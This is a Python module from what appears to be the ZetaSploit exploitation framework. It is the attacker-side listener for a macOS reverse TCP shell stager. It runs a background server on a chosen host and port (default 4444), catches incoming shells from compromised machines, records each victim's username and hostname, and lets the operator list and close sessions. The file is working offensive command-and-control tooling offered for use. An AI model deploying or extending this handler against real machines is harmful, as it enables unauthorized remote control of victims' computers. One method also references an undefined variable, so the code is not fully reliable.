#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import os
import sys
import socket
import time
import threading

from core.io import io
from core.badges import badges
from core.exceptions import exceptions
from core.helper import helper
from core.storage import storage
from core.jobs import jobs
from core.parser import parser

from data.modules.exploit.macos.stager.zetant_reverse_tcp.core.listener import listener
from data.modules.exploit.macos.stager.zetant_reverse_tcp.core.formatter import formatter

class ZetaSploitModule:
    def __init__(self):
        self.io = io()
        self.badges = badges()
        self.exceptions = exceptions()
        self.helper = helper()
        self.storage = storage()
        self.jobs = jobs()
        self.parser = parser()
        
        self.listener = listener()
        self.formatter = formatter()

        self.process = None
        self.controller = None
        
        self.sessions_id = dict()
        self.sessions_info = dict()
        
        self.details = {
            'Name': "macos/stager/zetant_reverse_tcp",
            'Authors': [
                'enty8080'
            ],
            'Description': "macOS reverse TCP shell with full remote functionality.",
            'Comments': [
                ''
            ]
        }
        
        self.options = {
            'LHOST': {
                'Description': "Local host.",
                'Value': self.helper.getip(),
                'Required': True
            },
            'LPORT': {
                'Description': "Local port",
                'Value': 4444,
                'Required': True
            },
        }

        self.commands = {
            'close': {
                'Description': "Close active session.",
                'Usage': "close <session_id>",
                'ArgsCount': 1,
                'NeedsArgs': True,
                'Args': [],
                'Run': self.close
            },
            'stop': {
                'Description': "Stop background server.",
                'Usage': "stop",
                'ArgsCount': 0,
                'NeedsArgs': False,
                'Args': [],
                'Run': self.stop_background_server
            },
            'sessions': {
                'Description': "List all active sessions.",
                'Usage': "list",
                'ArgsCount': 0,
                'NeedsArgs': False,
                'Args': [],
                'Run': self.sessions
            }
        }

    def close(self):
        session_id = self.commands['close']['Args'][0]
        try:
            session = self.sessions_id[int(session_id)]
            session.close_connection()
            self.badges.output_process("Closing session "+str(session_id)+"...")
            del self.sessions_id[int(session_id)]
            self.storage.delete_element("post/macos/zetant", int(session_id))
        except:
            self.badges.output_error("Invalid session!")

    def sessions(self):
        if not self.sessions_id:
            self.badges.output_error("No active sessions!")
        else:
            self.io.output("")
            self.formatter.format_sessions(sessions_info)
            self.io.output("")

    def start_background_listener(self, local_host, local_port):
        id_number = 0
        while True:
            try:
                session, address = self.listener.start_listening(local_host, local_port)
            except self.exceptions.GlobalException:
                self.jobs.delete_job("exploit/macos/stager/zetant_reverse_tcp")
                return
            if session:
                self.sessions_id[id_number] = session
                self.sessions_info[id_number] = {'host': address, 'username': session.send_command("username"), 'hostname': session.send_command("hostname")}
                self.badges.output_success("Session "+str(id_number)+" opened!")
                self.storage.set("post/macos/zetant", self.sessions_id)
                id_number += 1

    def start_background_server(self, local_host, local_port):
        self.badges.output_process("Starting server...")
        self.jobs.create_job("exploit/macos/stager/zetant_reverse_tcp", self.start_background_listener, (local_host, local_port), "exploit", self.details['Name'])

    def stop_background_server(self):
        self.badges.output_process("Stopping server...")
        for session in list(self.sessions_id.keys()):
            self.commands['close']['Args'] = []
            self.commands['close']['Args'].append(session)
            self.close()
        try:
            self.jobs.delete_job("exploit/macos/stager/zetant_reverse_tcp")
            self.badges.output_success("Successfully stopped server!")
        except self.exceptions.GlobalException:
            self.badges.output_error("Failed to stop server!")
            
    def run(self):
        local_host, local_port = self.parser.parse_options(self.options)
        self.start_background_server(local_host, local_port)

    def finish(self):
        self.listener.stop_listening()
